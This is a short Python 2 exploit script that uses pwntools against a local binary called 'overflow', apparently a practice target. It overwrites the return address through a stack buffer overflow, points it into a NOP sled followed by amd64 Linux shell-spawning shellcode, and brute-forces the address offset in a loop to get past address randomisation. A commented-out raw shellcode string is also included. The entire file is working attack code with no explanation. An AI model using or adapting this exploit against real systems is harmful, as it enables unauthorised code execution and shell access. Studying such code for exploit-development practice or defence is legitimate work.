#!/usr/bin/python
import struct
from subprocess import *
from pwn import *

# shellcode = "\x48\xB8\x48\x45\x4C\x4C\x4F\x09\x00\x00\x48\xBB\x00\x00\x00\x00\x00\x01\x00\x00\x48\x01\xD8\x50\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\x06\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05"
context(arch = 'amd64', os = 'linux')
shellcode = asm(shellcraft.amd64.linux.sh())

nops = '\x90'*1000
# ret = 0x7fffffffdac0
ret = 0x7fff8e3d02d8
junk = "A"*24
def gen_shell(offset):
    exploit = junk + struct.pack("<Q", ret + offset) + nops + shellcode
    return exploit
offset = len(nops)
miss = 1
while True:
    print 'offset: ' + hex(offset)
    p = Popen(['./overflow'], stdout = PIPE, stdin = PIPE, stderr = PIPE)
    exploit = gen_shell(offset)
    out = p.communicate(input = exploit)[0]
    if len(out) != 0:
        print 'Total try: ' , miss
        print 'Program output:\n' + out
        break
    p = Popen(['./overflow'], stdout = PIPE, stdin = PIPE, stderr = PIPE)
    exploit = gen_shell(-offset)
    out = p.communicate(input = exploit)[0]
    if len(out) != 0:
        print 'Total try: ' , miss
        print 'Program output:\n' + out
        break
    offset += len(nops)
    miss += 1